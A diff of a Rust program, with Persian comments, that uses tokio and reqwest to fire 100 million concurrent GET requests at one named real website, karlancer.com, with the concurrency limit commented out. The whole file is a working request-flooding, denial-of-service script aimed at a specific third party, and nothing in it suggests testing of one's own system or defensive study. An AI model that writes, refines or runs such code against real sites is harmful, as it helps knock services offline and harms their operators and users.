@@ -1,30 +1,39 @@
 use reqwest::Client;
-use tokio::time::{sleep, Duration};
+
+const NUM_REQUESTS: usize = 100_000_000; // تعداد درخواست‌ها
+// const CONCURRENCY_LIMIT: usize = 100; // تعداد همزمانی
 
 #[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
+async fn main() -> Result<(), reqwest::Error> {
     let client = Client::new();
-    let url = "https://karlancer.com";
-    let request_count = 100_000_000;
+    // let semaphore = Arc::new(Semaphore::new(CONCURRENCY_LIMIT));
 
     let mut handles = vec![];
 
-    for _ in 0..request_count {
+    for _ in 0..NUM_REQUESTS {
         let client = client.clone();
-        let url = url.to_string();
+        // let semaphore = semaphore.clone();
+
+        // let permit = semaphore.acquire().await.unwrap();
         let handle = tokio::spawn(async move {
-            while let Err(err) = client.get(&url).send().await {
-                eprintln!("Request error: {}", err);
+            let url = "https://karlancer.com"; // آدرس سرور مقصد
+
+            match client.get(url).send().await {
+                Ok(response) => {
+                    println!("Response: {:?}", response.status());
+                }
+                Err(e) => {
+                    eprintln!("Request failed: {:?}", e);
+                }
             }
+            // drop(permit); // آزادسازی مجوز پس از اتمام
         });
 
         handles.push(handle);
     }
 
     for handle in handles {
-        if let Err(err) = handle.await {
-            eprintln!("Handle error: {}", err);
-        }
+        handle.await.unwrap();
     }
 
     Ok(())
